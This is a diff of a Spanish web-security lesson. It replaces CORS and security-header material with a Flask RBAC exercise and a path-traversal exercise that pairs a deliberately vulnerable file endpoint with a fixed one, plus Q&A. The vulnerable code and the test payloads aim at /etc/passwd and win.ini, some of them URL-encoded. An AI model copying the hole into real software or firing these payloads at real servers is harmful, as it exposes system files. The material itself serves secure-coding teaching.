+                    'detalle': f'Se requiere permiso: {permiso}, rol actual: {user_role}'
+                }), 403
+
+            return f(*args, **kwargs)
+        return wrapper
+    return decorator
+
+def requiere_pertenencia_o_admin(f):
+    """Decorador que verifica que el recurso pertenezca al usuario o sea admin"""
+    @wraps(f)
+    def wrapper(doc_id, *args, **kwargs):
+        if 'user_id' not in session:
+            return jsonify({'error': 'No autenticado'}), 401
+
+        user_id = session['user_id']
+        user_role = USUARIOS[user_id]['role']
+
+        if doc_id not in DOCUMENTOS:
+            return jsonify({'error': 'Documento no encontrado'}), 404
+
+        # Admin puede acceder a todo
+        if user_role == 'admin':
+            return f(doc_id, *args, **kwargs)
+
+        # User/viewer solo a sus propios documentos
+        if DOCUMENTOS[doc_id]['owner_id'] != user_id:
+            return jsonify({'error': 'No tienes permiso para acceder a este documento'}), 403
+
+        return f(doc_id, *args, **kwargs)
+    return wrapper
+
+# ============================================================
+# RUTAS DE AUTENTICACION
+# ============================================================
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+
+    for uid, u in USUARIOS.items():
+        if u['username'] == username and u['password'] == password:
+            session['user_id'] = uid
+            session['username'] = username
+            session['role'] = u['role']
+            return jsonify({
+                'mensaje': 'Login exitoso',
+                'usuario': username,
+                'rol': u['role'],
+                'permisos': PERMISOS[u['role']]
+            })
+
+    return jsonify({'error': 'Credenciales invalidas'}), 401
+
+@app.route('/logout', methods=['POST'])
+def logout():
+    session.clear()
+    return jsonify({'mensaje': 'Sesion cerrada'})
+
+# ============================================================
+# RUTAS DE DOCUMENTOS CON RBAC
+# ============================================================
+
+@app.route('/api/documentos', methods=['GET'])
+@requiere_permiso('documentos:listar')
+def listar_documentos():
+    user_id = session['user_id']
+    user_role = USUARIOS[user_id]['role']
+
+    if user_role == 'admin':
+        # Admin ve todos
+        docs = [{'id': k, 'titulo': v['titulo'], 'owner_id': v['owner_id']}
+                for k, v in DOCUMENTOS.items()]
     else:
-        # Si el origen no esta permitido, no incluir header CORS
-        # El navegador bloqueara la request
-        pass
+        # User/viewer solo ven los suyos
+        docs = [{'id': k, 'titulo': v['titulo'], 'owner_id': v['owner_id']}
+                for k, v in DOCUMENTOS.items() if v['owner_id'] == user_id]
 
-    return response
+    return jsonify(docs)
 
-@app.after_request
-def after_request(response):
-    return configure_cors(response)
+@app.route('/api/documentos/<int:doc_id>', methods=['GET'])
+@requiere_permiso('documentos:leer')
+@requiere_pertenencia_o_admin
+def obtener_documento(doc_id):
+    doc = DOCUMENTOS[doc_id]
+    return jsonify(doc)
 
-@app.route('/api/perfil')
-def perfil():
-    if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
-
+@app.route('/api/documentos', methods=['POST'])
+@requiere_permiso('documentos:crear')
+def crear_documento():
+    global next_doc_id
+    data = request.get_json()
     user_id = session['user_id']
-    if user_id not in USUARIOS:
-        return jsonify({'error': 'Usuario no encontrado'}), 404
 
-    user_data = USUARIOS[user_id]
+    nuevo_doc = {
+        'id': next_doc_id,
+        'titulo': data.get('titulo', 'Sin titulo'),
+        'contenido': data.get('contenido', ''),
+        'owner_id': user_id,
+    }
+    DOCUMENTOS[next_doc_id] = nuevo_doc
+    next_doc_id += 1
 
-    # Solo devolver datos minimos necesarios
-    return jsonify({
-        'nombre': user_data['nombre'],
-        'email': user_data['email'],
-        # NO incluir cuenta bancaria ni saldo en respuestas CORS
-    })
+    return jsonify(nuevo_doc), 201
 
-@app.route('/api/perfil/completo')
-def perfil_completo():
-    """Endpoint que requiere mismo origen (no CORS)"""
-    if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
+@app.route('/api/documentos/<int:doc_id>', methods=['PUT'])
+@requiere_permiso('documentos:actualizar')
+@requiere_pertenencia_o_admin
+def actualizar_documento(doc_id):
+    data = request.get_json()
+    if 'titulo' in data:
+        DOCUMENTOS[doc_id]['titulo'] = data['titulo']
+    if 'contenido' in data:
+        DOCUMENTOS[doc_id]['contenido'] = data['contenido']
+    return jsonify(DOCUMENTOS[doc_id])
 
-    # Verificar que la request es del mismo origen
-    origin = request.headers.get('Origin', '')
-    if origin and origin not in ALLOWED_ORIGINS:
-        return jsonify({'error': 'Acceso denegado desde este origen'}), 403
+@app.route('/api/documentos/<int:doc_id>', methods=['DELETE'])
+@requiere_permiso('documentos:eliminar')
+@requiere_pertenencia_o_admin
+def eliminar_documento(doc_id):
+    doc = DOCUMENTOS.pop(doc_id)
+    return jsonify({'mensaje': f'Documento {doc_id} eliminado'})
 
-    user_id = session['user_id']
-    user_data = USUARIOS.get(user_id)
-    if not user_data:
-        return jsonify({'error': 'Usuario no encontrado'}), 404
+@app.route('/api/usuarios', methods=['GET'])
+@requiere_permiso('usuarios:gestionar')
+def listar_usuarios():
+    # Solo admin puede listar usuarios
+    return jsonify([
+        {'id': uid, 'username': u['username'], 'role': u['role']}
+        for uid, u in USUARIOS.items()
+    ])
 
-    # Datos completos solo disponibles para origenes confiables
-    return jsonify(user_data)
+@app.route('/api/configuracion', methods=['GET', 'PUT'])
+@requiere_permiso('configuracion:editar')
+def configuracion():
+    # Solo admin puede ver/editar configuracion
+    return jsonify({'mensaje': 'Configuracion del sistema', 'admin_only': True})
+
+# ============================================================
+# PRUEBAS
+# ============================================================
+
+def run_tests():
+    """Pruebas automatizadas para verificar RBAC"""
+    import requests
+
+    base = "http://127.0.0.1:5000"
+    test_session = requests.Session()
+
+    def print_test(name, result, expected=True):
+        status = "PASS" if result == expected else "FAIL"
+        print(f"[{status}] {name}")
+
+    # Test 1: Login como viewer
+    r = test_session.post(f"{base}/login", json={'username': 'invitado', 'password': 'view123'})
+    print_test("Login viewer", r.status_code == 200)
+    data = r.json()
+    print(f"  Rol: {data['rol']}, Permisos: {data['permisos']}")
+
+    # Test 2: Viewer intenta crear documento (debe fallar)
+    r = test_session.post(f"{base}/api/documentos", json={'titulo': 'Test', 'contenido': 'test'})
+    print_test("Viewer no puede crear documentos", r.status_code == 403)
+
+    # Test 3: Viewer puede leer documentos
+    r = test_session.get(f"{base}/api/documentos")
+    print_test("Viewer puede listar documentos", r.status_code == 200)
+
+    # Test 4: Login como user
+    r = test_session.post(f"{base}/login", json={'username': 'juan', 'password': 'user123'})
+    print_test("Login user", r.status_code == 200)
+
+    # Test 5: User crea documento
+    r = test_session.post(f"{base}/api/documentos", json={'titulo': 'Mi documento', 'contenido': 'Secreto'})
+    print_test("User crea documento", r.status_code == 201)
+
+    # Test 6: User intenta eliminar (debe fallar)
+    r = test_session.delete(f"{base}/api/documentos/1")
+    print_test("User no puede eliminar documentos", r.status_code == 403)
+
+    # Test 7: Login como admin
+    r = test_session.post(f"{base}/login", json={'username': 'admin', 'password': 'admin123'})
+    print_test("Login admin", r.status_code == 200)
+
+    # Test 8: Admin puede eliminar cualquier documento
+    r = test_session.delete(f"{base}/api/documentos/1")
+    print_test("Admin puede eliminar cualquier documento", r.status_code == 200)
+
+    # Test 9: Admin puede gestionar usuarios
+    r = test_session.get(f"{base}/api/usuarios")
+    print_test("Admin lista usuarios", r.status_code == 200)
+    print(f"  Usuarios: {r.json()}")
 
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
+    app.run(host='127.0.0.1', port=5000, debug=False)
 ```
 
-**Principios de CORS seguro:**
+**Ejecutar pruebas:**
 
-1. **Whitelist, no blacklist:** Listar origenes explicitamente permitidos
-2. **No reflejar Origin:** Nunca devolver el header Origin como Allow-Origin
-3. **No usar `*` con credenciales:** Es invalido y peligroso
-4. **Minimo privilegio:** Solo permitir los metodos y headers necesarios
-5. **Preflight con cache:** Cachear preflight OPTIONS para reducir overhead
-6. **Datos minimos:** No exponer datos sensibles en endpoints CORS
+```bash
+# Terminal 1: Iniciar servidor
+python rbac_api.py
+
+# Terminal 2: Ejecutar pruebas
+# Descomentar run_tests() al final del archivo y ejecutar:
+python -c "from rbac_api import *; run_tests()"
+```
+
+---
+
+## Ejercicio 3: Path Traversal - Version Vulnerable y Segura
+
+### Escenario
+
+Un endpoint sirve archivos de usuario. La version vulnerable permite path traversal.
+
+**Version vulnerable:**
+
+```python
+"""
+path_traversal_vulnerable.py
+"""
+from flask import Flask, send_file, request, jsonify
+import os
+
+app = Flask(__name__)
+BASE_DIR = os.path.join(os.getcwd(), 'user_files')
+
+@app.route('/api/files/<path:filename>')
+def get_file(filename):
+    # VULNERABLE: filename puede contener ../ para escapar del directorio
+    filepath = os.path.join(BASE_DIR, filename)
+    print(f"Intentando leer: {filepath}")
+    try:
+        return send_file(filepath)
+    except FileNotFoundError:
+        return jsonify({'error': 'Archivo no encontrado'}), 404
+```
+
+**Ataque:** `GET /api/files/../../../etc/passwd`
+
+**Version corregida con path validation:**
+
+```python
+"""
+path_traversal_seguro.py
+"""
+from flask import Flask, send_file, request, jsonify, abort
+import os
+
+app = Flask(__name__)
+BASE_DIR = os.path.abspath(os.path.join(os.getcwd(), 'user_files'))
+
+# Asegurar que el directorio base existe
+os.makedirs(BASE_DIR, exist_ok=True)
+
+def safe_path(base_dir, filename):
+    """
+    Valida y retorna un path seguro dentro de base_dir.
+    Previene path traversal resolviendo el path absoluto
+    y verificando que este dentro del directorio permitido.
+    """
+    # 1. Resolver el path absoluto
+    absolute_path = os.path.abspath(os.path.join(base_dir, filename))
+
+    # 2. Verificar que el path resuelto este dentro del directorio base
+    if not absolute_path.startswith(base_dir + os.sep):
+        return None
+
+    # 3. Verificar que el archivo exista
+    if not os.path.isfile(absolute_path):
+        return None
+
+    return absolute_path
+
+@app.route('/api/files/<path:filename>')
+def get_file(filename):
+    filepath = safe_path(BASE_DIR, filename)
+
+    if filepath is None:
+        return jsonify({'error': 'Archivo no encontrado o acceso denegado'}), 404
+
+    try:
+        return send_file(filepath)
+    except Exception as e:
+        return jsonify({'error': f'Error al leer archivo: {str(e)}'}), 500
+
+@app.route('/api/upload', methods=['POST'])
+def upload_file():
+    """Ejemplo de subida segura de archivos"""
+    if 'file' not in request.files:
+        return jsonify({'error': 'No se envio archivo'}), 400
+
+    file = request.files['file']
+
+    # 1. Validar nombre de archivo (evitar path traversal en el nombre)
+    filename = os.path.basename(file.filename)  # Solo el nombre base, sin directorios
+    if not filename:
+        return jsonify({'error': 'Nombre de archivo invalido'}), 400
+
+    # 2. Validar extension (opcional, depende del caso)
+    allowed_extensions = {'.txt', '.pdf', '.jpg', '.png', '.docx'}
+    ext = os.path.splitext(filename)[1].lower()
+    if ext not in allowed_extensions:
+        return jsonify({'error': f'Extension {ext} no permitida'}), 400
+
+    # 3. Generar nombre unico para prevenir colisiones
+    import uuid
+    unique_name = f"{uuid.uuid4().hex}{ext}"
+    save_path = os.path.join(BASE_DIR, unique_name)
+
+    # 4. Guardar archivo
+    file.save(save_path)
+
+    return jsonify({
+        'mensaje': 'Archivo subido exitosamente',
+        'filename': unique_name,
+        'url': f'/api/files/{unique_name}'
+    })
+
+# ============================================================
+# PRUEBAS
+# ============================================================
+
+def test_security():
+    """Pruebas de seguridad contra path traversal"""
+    import requests
+
+    base = "http://127.0.0.1:5000"
+
+    # Prueba 1: Path traversal simple
+    r = requests.get(f"{base}/api/files/../../../etc/passwd")
+    print(f"Path traversal simple: {r.status_code} - {r.json()}")
+
+    # Prueba 2: Path traversal con encoding
+    r = requests.get(f"{base}/api/files/..%2f..%2f..%2fetc%2fpasswd")
+    print(f"Path traversal encoded: {r.status_code} - {r.json()}")
+
+    # Prueba 3: Path traversal con doble encoding
+    r = requests.get(f"{base}/api/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")
+    print(f"Path traversal double encoded: {r.status_code} - {r.json()}")
+
+    # Prueba 4: Path traversal con backslash (Windows)
+    r = requests.get(f"{base}/api/files/..\\..\\..\\windows\\win.ini")
+    print(f"Path traversal backslash: {r.status_code} - {r.json()}")
+
+    # Prueba 5: Acceso legitimo (crear archivo de prueba primero)
+    import os
+    test_file = os.path.join(os.path.dirname(__file__), 'user_files', 'test.txt')
+    os.makedirs(os.path.dirname(test_file), exist_ok=True)
+    with open(test_file, 'w') as f:
+        f.write('Contenido de prueba')
+
+    r = requests.get(f"{base}/api/files/test.txt")
+    print(f"Acceso legitimo: {r.status_code} - {r.text}")
+
+    # Prueba 6: Archivo inexistente
+    r = requests.get(f"{base}/api/files/noexiste.txt")
+    print(f"Archivo inexistente: {r.status_code} - {r.json()}")
+
+if __name__ == '__main__':
+    # Descomentar para probar: test_security()
+    app.run(host='127.0.0.1', port=5000, debug=False)
+```
 
 ---
 
 ## Preguntas y Respuestas
 
 ### Pregunta 1
-**Cuales son los 5 security headers mas importantes y que protegen?**
+**Cual es la diferencia fundamental entre autenticacion y autorizacion? De un ejemplo donde falle cada una.**
 
-**Respuesta:** (1) **Strict-Transport-Security (HSTS)**: fuerza HTTPS y previene ataques SSL stripping y downgrade attacks. (2) **X-Frame-Options**: previene clickjacking al impedir que la pagina se cargue en un iframe. (3) **X-Content-Type-Options: nosniff**: previene que el navegador adivine el tipo MIME de un recurso (MIME sniffing attacks). (4) **Content-Security-Policy**: es la defensa mas potente contra XSS, controlando que recursos (scripts, estilos, imagenes) puede cargar la pagina. (5) **Referrer-Policy**: controla cuanta informacion de la URL se envia en el header Referer al navegar a otros sitios.
+**Respuesta:** La autenticacion verifica la identidad (quien eres), mientras que la autorizacion verifica los permisos (que puedes hacer). Ejemplo de falla de autenticacion: un sistema que permite login con contrasenas debiles o sin 2FA, permitiendo que un atacante ingrese como otro usuario. Ejemplo de falla de autorizacion: un usuario normal que accede a `/api/admin/delete` porque el sistema no verifica su rol antes de ejecutar la accion. Ambas deben funcionar correctamente para tener seguridad; una sin la otra es insuficiente.
 
 ### Pregunta 2
-**Por que es peligroso reflejar el header Origin como Access-Control-Allow-Origin?**
+**Que es IDOR y como se previene? De un ejemplo concreto.**
 
-**Respuesta:** Reflejar el Origin es peligroso porque un atacante puede hacer que el navegador de la victima envie una request desde `atacante.com` y el servidor respondera con `Access-Control-Allow-Origin: atacante.com`, permitiendo que `atacante.com` lea la respuesta. Combinado con `Access-Control-Allow-Credentials: true`, el atacante puede robar datos autenticados del usuario. Ejemplo: si el usuario esta autenticado en `bank.com`, y visita `atacante.com`, un script en `atacante.com` puede hacer fetch a `bank.com/api/perfil` y leer los datos bancarios porque el servidor refleja el origen.
+**Respuesta:** IDOR (Insecure Direct Object Reference) ocurre cuando una aplicacion expone identificadores internos (IDs numericos, UUIDs, nombres de archivo) y no verifica que el usuario tenga permiso para acceder a ese objeto. Ejemplo: `GET /api/factura/123` devuelve la factura sin verificar que pertenezca al usuario autenticado. Prevencion: (1) siempre verificar que el recurso pertenece al usuario antes de devolverlo, (2) usar identificadores no predecibles (UUIDs), (3) implementar controles de acceso a nivel de objeto, (4) nunca confiar en IDs enviados por el cliente sin validacion del lado del servidor.
 
 ### Pregunta 3
-**Que informacion sensible se debe evitar en respuestas de error?**
+**Que es path traversal y como se mitiga eficazmente?**
 
-**Respuesta:** En respuestas de error NUNCA se debe incluir: (1) stack traces completos (revelan estructura del codigo, rutas de archivos, versiones), (2) versiones de software (Python X.Y, Flask X.Y, MySQL X.Y), (3) nombres de archivos y numeros de linea, (4) consultas SQL o detalles de la base de datos, (5) tokens internos, API keys, o configuraciones del servidor, (6) nombres de usuarios internos o estructuras de directorios. En su lugar, devolver mensajes genericos como "Error interno del servidor" y loggear el detalle completo en el servidor para debugging.
+**Respuesta:** Path traversal es una tecnica donde el atacante usa `../` (o variantes como `..%2f`, `....//`, `..\\`) para navegar fuera del directorio permitido y acceder a archivos arbitrarios del sistema. Mitigaciones: (1) no confiar en el input del usuario para construir paths del sistema de archivos, (2) normalizar el path con `os.path.abspath()` y verificar que comience con el directorio base permitido, (3) usar `os.path.basename()` para eliminar componentes de directorio, (4) desactivar el soporte de path traversal en el servidor web, (5) usar identificadores numericos o UUIDs en lugar de nombres de archivo directos.
 
 ### Pregunta 4
-**Que es un ataque de directory listing y como se previene?**
+**Explica el principio de minimo privilegio con un ejemplo practico en una aplicacion web.**
 
-**Respuesta:** Directory listing ocurre cuando un servidor web muestra el listado de archivos de un directorio cuando no hay un archivo index (index.html, index.php). Esto expone toda la estructura del proyecto, archivos de configuracion, backups, y datos sensibles. Prevencion: (1) deshabilitar directory listing en el servidor web (Apache: `Options -Indexes`, Nginx: `autoindex off;`), (2) asegurarse de que todos los directorios tengan un archivo index, (3) no almacenar archivos sensibles dentro del webroot, (4) usar archivos .htaccess o configuracion del servidor para restringir acceso a directorios especificos.
+**Respuesta:** El principio de minimo privilegio establece que cada usuario, proceso o sistema debe tener exactamente los permisos necesarios para realizar su funcion, ni mas ni menos. Ejemplo practico en una aplicacion web: (1) los usuarios viewer solo tienen permiso de lectura en documentos especificos, (2) los usuarios user tienen lectura y escritura pero solo en documentos propios, (3) solo los admins tienen permiso de eliminacion y gestion de usuarios. Esto limita el dano potencial: si un atacante compromete una cuenta viewer, no puede modificar ni eliminar datos; si compromete una cuenta user, solo afecta datos de ese usuario, no del sistema completo.
 
 ### Pregunta 5
-**Cual es la diferencia entre CORS y CSRF? Como se relacionan?**
+**Como implementarias un sistema de control de acceso robusto en una API REST?**
 
-**Respuesta:** CORS (Cross-Origin Resource Sharing) es un mecanismo del navegador que controla que origenes pueden acceder a recursos de otro origen. CSRF (Cross-Site Request Forgery) es un ataque donde un sitio malicioso hace que el navegador de la victima envie una request a otro sitio donde esta autenticada. CORS mal configurado facilita CSRF porque permite leer la respuesta de la request cross-origin. Para prevenir: (1) CORS bien configurado (whitelist de origenes), (2) CSRF tokens en formularios, (3) SameSite cookies, (4) verificar header Referer/Origin en el servidor.
+**Respuesta:** Un sistema robusto incluye: (1) autenticacion fuerte (JWT con expiration corto, refresh tokens, 2FA opcional), (2) un modelo de permisos granular (no solo roles, sino permisos especificos como `documentos:leer`, `documentos:eliminar`), (3) verificacion en cada endpoint usando decoradores/middleware (nunca solo en el frontend), (4) verificacion de pertenencia del recurso (el usuario solo accede a sus propios recursos a menos que sea admin), (5) logging de todos los accesos denegados para deteccion de ataques, (6) pruebas automatizadas que verifiquen que cada rol solo puede hacer lo que debe, (7) revision periodica de la matriz de permisos.
 
 ### Pregunta 6
-**Que es OWASP ASVS y como ayuda a prevenir configuraciones inseguras?**
+**Cual es el riesgo de confiar en el rol que el cliente envia en la request?**
 
-**Respuesta:** OWASP ASVS (Application Security Verification Standard) es un estandar que define requisitos de seguridad para aplicaciones web organizados en niveles (L1, L2, L3). Para configuraciones inseguras, ASVS especifica requisitos como: V14.1 (verificar que configuraciones por defecto y servicios innecesarios esten deshabilitados), V14.2 (verificar headers de seguridad), V14.4 (verificar que el manejo de errores no revele informacion), V14.5 (verificar configuracion CORS). ASVS proporciona una checklist que los equipos pueden usar durante desarrollo, testing y auditoria para asegurar que todas las configuraciones de seguridad esten correctamente implementadas.
+**Respuesta:** Confiar en el rol enviado por el cliente es extremadamente peligroso porque cualquier atacante puede modificar la request para enviar un rol de admin. Ejemplo: un sistema que lee `request.json.get('role')` para determinar si el usuario es admin. Un atacante simplemente envia `{"role": "admin"}` en el body de la request y obtiene privilegios administrativos. La unica fuente confiable del rol debe ser el servidor, obtenido de la sesion del usuario o del token JWT firmado, nunca de parametros que el cliente pueda manipular.
 
 ---
 
 ## Tarea / Lectura Recomendada
 
-1. **Leer:** OWASP Security Headers Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
-2. **Leer:** OWASP ASVS (Application Security Verification Standard) - https://owasp.org/www-project-application-security-verification-standard/
-3. **Practicar:** Usar securityheaders.com para analizar headers de sitios populares
-4. **Experimentar:** Configurar un servidor Flask con todos los security headers y verificar con curl
-5. **Leer:** Mozilla Observatory - https://observatory.mozilla.org/ (herramienta para evaluar security headers)
-6. **Profundizar:** Investigar el ataque "CORS misconfiguration" en PortSwigger Web Security Academy
-7. **Leer:** OWASP CORS Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html
+1. **Leer:** OWASP Authorization Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
+2. **Leer:** OWASP Access Control Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html
+3. **Practicar:** PortSwigger - Access Control labs: https://portswigger.net/web-security/access-control
+4. **Leer:** OWASP Insecure Direct Object Reference Prevention - https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
+5. **Practicar:** Implementar RBAC en un proyecto propio usando decoradores en Python o middleware en Express/Spring
+6. **Experimentar:** Usar Burp Suite para interceptar requests de una app vulnerable a IDOR y modificar parametros
+
 
 
